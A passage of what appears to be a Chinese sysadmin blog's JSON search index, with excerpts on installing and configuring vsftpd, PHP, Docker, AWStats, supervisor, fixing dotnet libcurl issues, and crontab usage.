db=/etc/vsftpd/vsftpd_login [root@00 vsftpd]# vi vsftpd.conf anonymous_enable=NO local_enable=YES write_enable=NO anon_upload_enable=NO anon_mkdir_write_enable=NO anon_other_write_enable=NO anon_world_readable_only=NO reverse_lookup_enable=NO chroot_local_user=YES allow_writeable_chroot=YES guest_enable=YES guest_username=www pam_service_name=/etc/pam.d/vsftpd user_config_dir=/etc/vsftpd/user_conf xferlog_enable=YES xferlog_file=/var/log/vsftpd.log listen=YES listen_port=21 pasv_min_port=30000 pasv_max_port=30020 use_localtime=YES data_connection_timeout=180 [root@00 vsftpd]# mkdir /etc/vsftpd/user_conf [root@00 vsftpd]# vim ./user_conf/vsftpd01 local_root=/var/ftproot write_enable=YES anon_world_readable_only=NO anon_upload_enable=YES anon_mkdir_write_enable=YES anon_other_write_enable=YES [root@00 vsftpd]# touch ./user_conf/vsftpd02 1.1.4. 修改selinux安全上下文(如果关闭selinux 忽略此步) [root@00 vsftpd]# getsebool -a|grep ftp ftpd_anon_write --\u003e off ftpd_connect_all_unreserved --\u003e off ftpd_connect_db --\u003e off ftpd_full_access --\u003e off ftpd_use_cifs --\u003e off ftpd_use_fusefs --\u003e off ftpd_use_nfs --\u003e off ftpd_use_passive_mode --\u003e off httpd_can_connect_ftp --\u003e off httpd_enable_ftp_server --\u003e off tftp_anon_write --\u003e off tftp_home_dir --\u003e off [root@00 vsftpd]# setsebool -P ftpd_full_access=on 1.1.5. 取消防火墙对于ftp的限制(firewalld ，iptables 请自行参考相关配置) [root@00 ~]# firewall-cmd --add-service=ftp success [root@00 ~]# firewall-cmd --add-service=ftp --permanent success 1.1.6. 重启vsftpd [root@00 vsftpd]# systemctl restart vsftpd #redhat7.x以下是service vsftpd restart [root@00 ~]# systemctl enable vsftpd # 将vsftpd加入开机启动 redhat7.x以下应该是chkconfig vsftpd add Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /usr/lib/systemd/system/vsftpd.service. 2. 本地用户 本地用户和虚拟用户的区别只是在于配置文件和建设用户的区别 2.1. 安装vsftpd ： [root@cloud ~]# yum install vsftpd 已加载插件：fastestmirror, langpacks Repository base is listed more than once in the configuration Repository updates is listed more than once in the configuration Repository extras is listed more than once in the configuration Repository centosplus is listed more than once in the configuration Loading mirror speeds from cached hostfile * base: mirrors.cqu.edu.cn * extras: mirror.lzu.edu.cn * updates: mirrors.sohu.com 正在解决依赖关系 ..........省部分内容............ 正在安装 : vsftpd-3.0.2-21.el7.x86_64 1/1 验证中 : vsftpd-3.0.2-21.el7.x86_64 1/1 已安装: vsftpd.x86_64 0:3.0.2-21.el7 完毕！ [root@cloud ~]# mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftp","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Php安装维护","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":" 前言 记录一个php的安装过程，仅作为个人使用记录，可参考 基础环境: CentOS 7.6 php 5.6.38 2. 安装 [root@00 ~]# mkdir /opt/software [root@00 ~]# cd /opt/software [root@00 software]# useradd -d /var/ftproot -s /sbin/nologin www [root@00 software]# yum install -y zlib-devel libxml2-devel libjpeg-devel libjpeg-turbo-devel freetype-devel libpng-devel gd-devel libcurl-devel libxslt-devel openssl openssl-devel mhash libmcrypt-devel mcrypt gcc glibc gcc-c++ [root@00 software]# wget https://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.15.tar.gz --no-check-certificate [root@00 software]# tar xzf libiconv-1.15.tar.gz [root@00 software]# cd libiconv-1.15 [root@00 libiconv-1.15]# ./configure --prefix=/usr/local/libiconv [root@00 libiconv-1.15]# make \u0026\u0026 make install ## ---- 过程省略 ---- ## ## ---- 过程错误自行排查 ---- ## [root@00 libiconv-1.15]# cd /opt/software [root@00 software]# wget http://mirrors.sohu.com/php/php-5.6.38.tar.gz [root@00 software]# tar -xzf php-5.6.38.tar.gz [root@00 php-5.6.38]# cd php-5.6.38 ## 标准的生产环境编译参数(nginx) ## ------------------------ ## ## apache取消以下参数(apache+php时是不需要将php启动的，php是将模块直接编译进入apache的) ## --enable-opcache=no ## --enable-fpm ## --with-fpm-user=www ## --with-fpm-group=www ## 添加以下参数，指向apache的apxs ## --with-apxs2=/opt/apache/bin/apxs ## ------------------------ ## [root@00 php-5.6.38]# ./configure \\ --prefix=/opt/php5.6.38 \\ --with-config-file-path=/opt/php5.6.38/etc \\ --with-mysql=mysqlnd \\ --with-mysqli=mysqlnd \\ --with-pdo-mysql=mysqlnd \\ --with-iconv-dir=/usr/local/libiconv \\ --with-freetype-dir \\ --with-jpeg-dir \\ --with-png-dir \\ --with-zlib \\ --with-libxml-dir \\ --enable-xml \\ --disable-rpath \\ --disable-debug \\ --enable-bcmath \\ --enable-shmop \\ --enable-sysvsem \\ --enable-inline-optimization \\ --with-curl \\ --enable-mbregex \\ --enable-fpm \\ --enable-mbstring \\ --with-mcrypt \\ --with-gd \\ --enable-gd-native-ttf \\ --with-openssl \\ --with-mhash \\ --enable-pcntl \\ --enable-sockets \\ --with-xmlrpc \\ --enable-zip \\ --enable-soap \\ --enable-short-tags \\ --enable-static \\ --with-xsl \\ --with-fpm-user=www \\ --with-fpm-group=www \\ --enable-ftp \\ --enable-opcache=no # # --enable-opcache 此扩展可能不稳定，因此关闭， # 也可以使用--disable-opcache 进行关闭，默认是启用的 # (现当前版本不知道是否稳定些了) # # 5.3 添加的额外参数 # --with-curlwrappers # --enable-safe-mode # --enable-zend-multibyte [root@00 php-5.6.38]# make \u0026\u0026 make install ## ---- 过程省略 ---- ## ## ---- 过程错误自行排查 ---- ## [root@00 php-5.6.38]# cp -v ./php.ini-production /opt/php5.6.38/etc/php.ini [root@00 php-5.6.38]# cp -v /opt/php5.6.38/etc/php-fpm.conf.default /opt/php5.6.38/etc/php-fpm.conf [root@00 php-5.6.38]# ln -s /opt/php5.6.38/ /opt/php # 优化路径，用于后续可能的升级 ## --- 安装完成 --- ## 若需要将php-fpm 加入到系统服务当中， 在/opt/software/php-5.6.38/sapi/fpm目录下,将php-fpm.service文件中对应的${prefix}和${exec_prefix}改为程序编译后的对应目录，让后将文件cp到/usr/lib/systemd/system/下, 然后执行systemctl daemon-reload重加载即可，然后就可以使用systemctl {start|stop|restart} php-fpm.services 对php-fpm进行管理了(CentOS 6.x 的不知道) 2.1 php 扩展编译 扩展安装的操作步骤(以xcache为例): 下载需要安装的扩展源码，解压进去后，先执行 /opt/php5.6.38/bin/phpize 生成configure配置文件 配置当前扩展编译./configure --enable-xcache --with-php-config=/opt/php5.6.38/bin/php-config 编译并安装 make \u0026\u0026 make install,编译并安装成功后会在/opt/php5.6.38/lib/php/extensions目录下生成对应目录，里面包含一个xcache.so的文件. 3. 相关参数说明 3.1. php-fpm.conf pid = run/php-fpm.pid error_log = log/php-fpm.log user = www group = www # 设置接受 FastCGI 请求的地址 可为socket路径,(socket默认位置php根目录) listen = 127.0.0.1:9000 #允许连接到 FastCGI 的服务器 IPV4 地址 listen.allowed_clients = 127.0.0.1 # 设置进程管理器如何管理子进程，dynamic动态设置,必须配合 # pm.max_children，pm.start_servers，pm.min_spare_servers，pm.max_spare_servers参数进行设置 pm = dynamic # 设置最大可创建的子进程的数量(仅代表动态设置) pm.max_children = 300 # 设置启动时创建的子进程数目 pm.start_servers = 30 # pm.*_spare_servers 设置空闲服务进程的最低/最大数目 pm.min_spare_servers = 30 pm.max_spare_servers = 300 # 设置每个子进程重生之前服务的请求数 pm.max_requests = 65535 # 设置文件打开描述符的 rlimit 限制，默认系统定义值 rlimit_files = 65535 详细参数说明: https://secure.php.net/manual/zh/install.fpm.configuration.php 4. windows_php iis 可直接安装为web-platfrom，然后搜索php manager https://www.iis.net/downloads/microsoft/web-platform-installer 若无法正常使用","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:0:0","tags":["linux","php"],"title":"Php安装维护","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"Docker 部署与常用操作","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":" Docker 是通过内核虚拟化技术(namespaces及cgroups等)来提供容器的资源隔离与安全保障等.由于docker通过操作系统层的虚拟化实现隔离,所以Dociker容器在运行时,不需要虚拟机(VM)额外的操作系统开销,提高资源利用率. 安装环境: CentOS 7 docker: 17.09.0-ce virtualbox: 5.1.30 1. 前言 docker 能干什么? 简化配置 代码流水线管理 环境一致性,提高开发效率 快速部署 … 2. 安装并启动docker [root@00 ~]# yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo #导入docker源以便于安装最新版docker [root@00 ~]# yum install docker-ce -y #########忽略安装过程############# [root@00 ~]# systemctl start docker #启动docker ● docker.service - Docker Application Container Engine Loaded: loaded (/usr/lib/systemd/system/docker.service; disabled; vendor preset: disabled) Active: active (running) since 三 2017-10-25 01:30:27 EDT; 4min 2s ago Docs: https://docs.docker.com Main PID: 2788 (dockerd) Memory: 21.3M CGroup: /system.slice/docker.service ├─2788 /usr/bin/dockerd └─2793 docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --metrics-interval=0 --start-time... #############省略部分数据################### [root@00 ~]# ifconfig docker0 # docker 安装成功后默认创建一个docker0默认的网桥 docker0: flags=4099\u003cUP,BROADCAST,MULTICAST\u003e mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 0.0.0.0 ether 02:42:72:b8:2a:55 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0﻿​ 3. docker的使用 3.1. 镜像的增、删、查 # \u003e\u003e\u003e 镜像查询 [root@00 ~]# docker search centos #镜像搜索 INDEX NAME DESCRIPTION STARS OFFICIAL AUTOMATED docker.io docker.io/centos The official build of CentOS. 3732 [OK] docker.io docker.io/ansible/centos7-ansible Ansible on Centos7 102 [OK] docker.io docker.io/jdeathe/centos-ssh CentOS-6 6.9 x86_64 / CentOS-7 7.4.1708 x8... 87 [OK] #------------------省略部分数据--------------------- # \u003e\u003e\u003e 镜像下载 [root@00 default]# docker pull docker.io/centos #镜像远程下载 #关于docker的加速器的配置，这个阿里云也有相关配置方法，具体不多说，下面是具体的配置文件和格式 # /etc/docker/daemon.json #{ # \"registry-mirrors\": [\"你的加速地址\"] #} # Using default tag: latest Trying to pull repository docker.io/library/centos ... latest: Pulling from docker.io/library/centos d9aaf4d82f24: Pull complete Digest: sha256:eba772bac22c86d7d6e72421b4700c3f894ab6e35475a34014ff8de74c10872e # \u003e\u003e\u003e 镜像查看 [root@00 ~]# docker images #查看已安装镜像 REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/centos latest 196e0ce0c9fb 5 weeks ago 196.6 MB # \u003e\u003e\u003e 镜像导出 [root@00 ~]# docker save -o centos.tar docker.io/centos # 导出镜像到本地 [root@00 default]# docker rmi 196e0ce0c9fb # 镜像删除，使用镜像id进行删除 Untagged: docker.io/centos:latest Untagged: docker.io/centos@sha256:eba772bac22c86d7d6e72421b4700c3f894ab6e35475a34014ff8de74c10872e Deleted: sha256:196e0ce0c9fbb31da595b893dd39bc9fd4aa78a474bbdc21459a3ebe855b7768 Deleted: sha256:cf516324493c00941ac20020801553e87ed24c564fb3f269409ad138945948d4 # \u003e\u003e\u003e 镜像导入 [root@00 ~]# docker load --input centos.tar # 导入本的镜像或者docker load \u003c centos.tar，关于docker命令，如果你是普通用户，只需要把你的用户加入到docker组当中就不需要sudo才可以执行命令了 sudo usermod -aG docker zabbix cf516324493c: Loading layer [==================================================\u003e] 205.2 MB/205.2 MB Loaded image: docker.io/centos:latest [root@00 ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/centos latest 196e0ce0c9fb 5 weeks ago 196.6 MB 3.2. 容器的添加、删除、登陆 [root@00 ~]# docker run centos /bin/echo 'hello word' # centos 为镜像名称，命令格式:docker run [参数] [镜像名称] [运行命令] (注：进程结束即代表容器结束) hello word ############ 新建一个mydocker的容器，他的镜像是centos ######## ############ --name：指定容器名称 -t：让docker分配一个伪终端，-i：表示打开标准输入 ######## [root@00 ~]# docker run --name mydocker -t -i centos /bin/bash [root@8679d53c43c4 /]# ls #\u003c=======注意看主机名已经改变 anaconda-post.log bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var [root@8679d53c43c4 /]# uname -a Linux 8679d53c43c4 3.10.0-327.el7.x86_64 #1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux [root@8679d53c43c4 /]# exit # 退出容器，则进程关闭，代表此容器已完全关闭 exit [root@00 ~]# docker ps -a # 查看已有容器 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 8679d53c43c4 centos \"/bin/b","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"Awstats日志分析系统","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":" 安装环境 centos 6.7 nginx 1.12 awstats 7.5 [ 一个小坑 ] 这个是我早期的一个操作过程，当时是第一次用，然后跟着别人的一篇文章搭建的(perl环境)，但用了一段时间后，发现官方提供了php环境的配置信息，在/pathto/awstats/tools/nginx中。 如果有php环境，将里面的awstats-fcgi.php复制到/pathto/awstats/wwwroot/cgi-bin/中,重命名为fcgi.php。 然后将awstats-nginx.conf复制到自己的nginx conf下，修改里面的默认路径/usr/share/awstats/wwwroot 为自己的/pathto/awstats/wwwroot路径即可。awasts的安装及配置和下面一样(跳过配置nginx,测试跳过fcgi启动)。 1. 安装CPAN、FCGI和FCGI::ProcManager [root@00 ~]# cd /opt/software [root@00 software]# wget http://www.cpan.org/authors/id/A/AN/ANDK/CPAN-2.10.tar.gz [root@00 software]# wget http://www.cpan.org/authors/id/B/BO/BOBTFISH/FCGI-ProcManager-0.24.tar.gz [root@00 software]# tar xzvf CPAN-2.10.tar.gz [root@00 software]# cd CPAN-2.10 [root@00 CPAN-2.10]# perl Makefile.PL [root@00 CPAN-2.10]# make [root@00 CPAN-2.10]# make install [root@00 software]# tar xzvf FCGI-ProcManager-0.24.tar.gz [root@00 software]# cd FCGI-ProcManager-0.24 [root@00 FCGI-ProcManager-0.24]# perl Makefile.PL [root@00 FCGI-ProcManager-0.24]# make [root@00 FCGI-ProcManager-0.24]# make install ## 也可以使用yum直接安装(需要导入epel源) [root@00 software]# yum install perl-CPAN [root@00 software]# yum install perl-FCGI perl-FCGI-ProcManager 2. 安装awasts及配置 [root@00 software]# wget https://nchc.dl.sourceforge.net/project/awstats/AWStats/7.5/awstats-7.5.zip [root@00 software]# unzip awstats-7.5.zip # 这个下载的是zip包，所以需要unzip进行解压 [root@00 software]# find ./awstats-7.5 -type d -name \"*\" -exec chmod 755 {} \\; #这个解压后文件夹的权限变成了全权限，我这儿改了下 [root@00 software]# cp -r awstats-7.5 /data/ #/usr/local/awstats 是他默认的目录，这儿我把他改到我的数据目录中去 [root@00 data]# chown -Rf www.www awstats #更改用户所有者权限(nginx所属组) [root@00 data]# cd /data [root@00 data]# ln -s /data/awstats-7.5/ /data/awstats #创建软连接，用于版本控制，此步骤可以不做 [root@00 data]# cd awstats/tools [root@00 tools]# ./awstats_configure.pl ----- AWStats awstats_configure 1.0 (build 20140126) (c) Laurent Destailleur ----- This tool will help you to configure AWStats to analyze statistics for one web server. You can try to use it to let it do all that is possible in AWStats setup, however following the step by step manual setup documentation (docs/index.html) is often a better idea. Above all if: - You are not an administrator user, - You want to analyze downloaded log files without web server, - You want to analyze mail or ftp log files instead of web log files, - You need to analyze load balanced servers log files, - You want to 'understand' all possible ways to use AWStats... Read the AWStats documentation (docs/index.html). -----\u003e Running OS detected: Linux, BSD or Unix Warning: AWStats standard directory on Linux OS is '/usr/local/awstats'. If you want to use standard directory, you should first move all content of AWStats distribution from current directory: /data/awstats-7.5 to standard directory: /usr/local/awstats And then, run configure.pl from this location. Do you want to continue setup from this NON standard directory [yN] ? y #====\u003e此处是因为我转移了目录的原因,如果是使用的默认目录,是没有这个提示信息的,这儿继续就可以了 -----\u003e Check for web server install Enter full config file path of your Web server. Example: /etc/httpd/httpd.conf Example: /usr/local/apache2/conf/httpd.conf Example: c:\\Program files\\apache group\\apache\\conf\\httpd.conf Config file path ('none' to skip web server setup): \u003e none #这个是配置apache的，此次使用的是nginx，所以这儿不配置 Your web server config file(s) could not be found. You will need to setup your web server manually to declare AWStats script as a CGI, if you want to build reports dynamically. See AWStats setup documentation (file docs/index.html) -----\u003e Update model config file '/usr/local/awstats/wwwroot/cgi-bin/awstats.model.conf' File awstats.model.conf updated. -----\u003e Need to create a new config file ? Do you want me to build a new AWStats config/profile file (required if first install) [y/N] ? y # -----\u003e Define config file name to create What is the name of your web site or profile analysis ? Example: www.mysite.com Example: demo Your web site, virtual server or profile name: \u003e example.com #这个配置文件是统计example.com这个站点的，名字可以随便写，与","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"Dotnet运维故障记录","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","dotnet","解决方案"],"title":"Dotnet运维故障记录","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"安装故障 Failed to load , error: libunwind.so.8: cannot open shared object file: No such file or directory Failed to bind to CoreCLR at ‘/root/dotnet/shared/Microsoft.NETCore.App/2.0.0/libcoreclr.so‘ yum install libunwind -y FailFast: Couldn‘t find a valid ICU package installed on the system. Set the configuration flag System.Globalization.Invariant to true if you want to run with no globalization support. yum install icu -y 程序异常 报错信息 The handler does not support custom handling of certificates with this combination of libcurl (7.29.0) and its SSL backend (\"NSS/3.28.4\") 最近接收到了开发反馈dotnet程序发送短信异常，据说也是一直都有的问题，协助查询了多方资料，发现是libcurl版本的问题，由于服务器上存在了多个dotnet站点，也不敢轻易去升级，后来又听说所有的dotnet都存在，于是对curl进行了一次升级，重启dotnet短信正常 接入一个写的比较清晰的文章 https://blog.azpro.cn/index.php/archives/113/ 升级过程 : # yum install libcurl-openssl -y # wget https://curl.haxx.se/download/curl-7.64.0.tar.gz # tar -xzvf curl-7.64.0.tar.gz # cd curl-7.64.0/ # ./configure --prefix=/opt/curl-7.64.0 --with-ssl # make \u0026\u0026 make install # mv /usr/bin/curl /usr/bin/curl.old # mv /usr/bin/curl-config /usr/bin/curl-config.old # ln -s /opt/curl-7.64.0/ /opt/curl # ln -s /opt/curl/bin/curl /usr/bin/curl # ln -s /opt/curl/bin/curl-config /usr/bin/curl-config # echo \"/opt/curl/lib\" \u003e\u003e /etc/ld.so.conf.d/curl-x86_64.conf # ldconfig ","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","dotnet","解决方案"],"title":"Dotnet运维故障记录","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Supervisor批量进程管理","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"supervisor 一个简单的python编写的进程管理器，功能类似是将普通进程以守护进程的形式运行到后台 supervisord-monitor 一个集中的管理前端 https://github.com/mlazarov/supervisord-monitor 1. 安装 $\u003e pip3 install supervisor 配置及启动 # 生成配置文件 $\u003e echo_supervisord_conf \u003e /etc/supervisord.conf # 创建systemd 管理脚本 $\u003e vim /etc/systemd/system/supervisord.service [Unit] Description=Process Monitoring and Control Daemon After=rc-local.service [Service] Type=forking ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf LimitCORE=infinity LimitNOFILE=65535 LimitNPROC=65535 [Install] WantedBy=multi-user.target # # # $\u003e systemctl daemon-reload $\u003e systemctl start supervisord # # supervisorctl status：查看所有进程的状态 # supervisorctl stop es：停止es # supervisorctl start es：启动es # supervisorctl restart es: 重启es # supervisorctl update :配置文件修改后可以使用该命令加载新的配置 # supervisorctl reload: 重新启动配置中的所有程序 3. 配置文件说明 # 注意安装的版本，版本不一样配置文件有差异,以下配置文件是3.1.4 [unix_http_server] file=/tmp/supervisor.sock ; the path to the socket file [inet_http_server] ; inet (TCP) server disabled by default port=0.0.0.0:9001 ; username=\u003cusername\u003e ; password=\u003cpassword\u003e [supervisord] logfile=/tmp/supervisord.log logfile_maxbytes=50MB logfile_backups=10 loglevel=info pidfile=/tmp/supervisord.pid nodaemon=false silent=false minfds=1024 ; 这个是最少系统空闲的文件描述符，低于这个值supervisor将不会启动; default 1024 minprocs=200 ; 最小可用的进程描述符，低于这个值supervisor也将不会正常启动;default 200 ;directory=/tmp ; default is not to cd during start ;nocleanup=false ; 为false时，启动会清除历史的子进程日志; default false ;childlogdir=/tmp ; 'AUTO' child log dir, default $TEMP(python -c \"import tempfile;print tempfile.gettempdir()\") environment=TZ=Asia/Shanghai ; environment=TZ=Asia/Shanghai,TZ=Asia/Shanghai, [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL for a unix socket ; [program:theprogramname] ; command=/bin/cat ; directory=/tmp ; ; process_name=example.com(80) ; autostart=true ; 是否在 supervisord 启动时启动 ; autorestart=true ; 子进程挂掉时候自动重启 ; user=www ; stopasgroup=true ; killasgroup=true ; redirect_stderr=true ; stdout_logfile=/var/log/example.com.log ; stdout_logfile_maxbytes=50MB ; stdout_logfile_backups=10 ; ; environment=TZ=Asia/Shanghai ; ; exitcodes=CODE1,CODE2 ; 允许的进程退出码。以\",\"分隔，默认为0,2。 [include] files = /etc/supervisord.d/*.ini 3.1. 配置参数说明 https://blog.csdn.net/lvmuheng/article/details/72367849 [unix_http_server] file=/tmp/supervisor.sock ; socket文件的路径，supervisorctl用XML_RPC和supervisord通信就是通过它进行 的。如果不设置的话，supervisorctl也就不能用了 不设置的话，默认为none。 非必须设置 ;chmod=0700 ; 这个简单，就是修改上面的那个socket文件的权限为0700 不设置的话，默认为0700。 非必须设置 ;chown=nobody:nogroup ; 这个一样，修改上面的那个socket文件的属组为user.group 不设置的话，默认为启动supervisord进程的用户及属组。非必须设置 ;username=user ; 使用supervisorctl连接的时候，认证的用户 不设置的话，默认为不需要用户。 非必须设置 ;password=123 ; 和上面的用户名对应的密码，可以直接使用明码，也可以使用SHA加密 如：{SHA}82ab876d1387bfafe46cc1c8a2ef074eae50cb1d 默认不设置。。。非必须设置 ;[inet_http_server] ; 侦听在TCP上的socket，Web Server和远程的supervisorctl都要用到他 不设置的话，默认为不开启。非必须设置 ;port=127.0.0.1:9001 ; 这个是侦听的IP和端口，侦听所有IP用 :9001或*:9001。 这个必须设置，只要上面的[inet_http_server]开启了，就必须设置它 ;username=user ; 这个和上面的uinx_http_server一个样。非必须设置 ;password=123 ; 这个也一个样。非必须设置 [supervisord] ;这个主要是定义supervisord这个服务端进程的一些参数的 这个必须设置，不设置，supervisor就不用干活了 logfile=/tmp/supervisord.log ; 这个是supervisord这个主进程的日志路径，注意和子进程的日志不搭嘎。 默认路径$CWD/supervisord.log，$CWD是当前目录。。非必须设置 logfile_maxbytes=50MB ; 这个是上面那个日志文件的最大的大小，当超过50M的时候，会生成一个新的日 志文件。当设置为0时，表示不限制文件大小 默认值是50M，非必须设置。 logfile_backups=10 ; 日志文件保持的数量，上面的日志文件大于50M时，就会生成一个新文件。文件 数量大于10时，最初的老文件被新文件覆盖，文件数量将保持为10 当设置为0时，表示不限制文件的数量。 默认情况下为10。。。非必须设置 loglevel=info ; 日志级别，有critical, error, warn, info, debug, trace, or blather等 默认为info。。。非必须设置项 pidfile=/tmp/supervisord.pid ; supervisord的pid文件路径。 默认为$CWD/supervisord.pid。。。非必须设置 nodaemon=false ; 如果是true，supervisord进程将在前台运行 默认为false，也就是后台以守护进程运行。。。非必须设置 minfds=1024 ; 这个是最少系统空闲的文件描述符，低于这个值supervisor将不会启动。 系统的文件描述符在这里设置cat /proc/sys/fs/file-max 默认情况下为1024。。。非必须设置 minprocs=200 ; 最小可用的进程描述符，低于这个值supervisor也将不会正常启动。 ulimit -u这个命令，可以查看linux下面用户的最大进程数 默认为200。","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/:0:0","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","那些有用没用的"],"content":"那些有用没用的问题收集","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"1. 计划任务配置中/etc/crontab和crontab -e的区别 https://blog.csdn.net/qq_36937234/article/details/80558871 1.1. 二者差异 级别差异 /etc/crontab是系统级别的crontab，系统的设置 crontab -e是用户级的crontab linux下实际保存在/var/spool/cron/username中 有些系统设置即使用root账号crontab -e也不行，必须放到/etc/crontab中 语法区别 /etc/crontab 有用户字段 */5 * * * * root /root/scripts/refresh.sh \u003e/dev/null 2\u003e\u00261 crontab -e中不能设置用户字段 1 * */1 * * /bin/sh /root/scripts/refresh.sh \u003e /dev/nul 2\u003e\u00261 1.2. 注意点 /var/spool/clientmqueue目录过大，占用磁盘满了 原因：/var/spool/clientmqueue是如果系统中有用户开启了cron，而cron中执行的程序有输出内容，输出内容会以邮件形式发给cron的用户，而sendmail没有启动所以就产生了这些文件 解决：将输出重定向，如\u003e /dev/null 2\u003e\u00261，补充：错误输出也要重定向 /etc/crontab的读写权限 不要随意改动这个文件的读写权限，这个文件应该设置成644或者600，否则会报(system) BAD　FILE MODE (/etc/crontab ) 手动能够执行，但是crontab脚本里面不执行 解决：检查下crontab的环境变量 ： HELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root HOME=/ 2. CentOS 7.x 设置开机启动项报错，或软连接报 Too many levels of symbolic links 这个问题报错原因其实已经说明得很明显了，实际上就是在同一个地方创建了同样名字的多个软连接，之所以记录是应为网上鬼扯了一些毫无关联解决方案，可能也存在那样的问题，这儿遇见的是在设置开机启动项systemctl enable的时候报的错，检查了下发现，systemctl enable设置的目录确实是已经存在了一个同名的了，把原来的那个删掉或者改个名字，在创建正常 3. HTTP 响应码分类 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status 4. Git 和 SVN的区别 git是分布式的，svn是集中式的 git存储数据是以元数据形式存储，svn是按文件，原数据怎样的结构，存储就是怎样的结构 分支不同，svn的分支就是复制了一个目录出来 ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:0:0","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Nginx 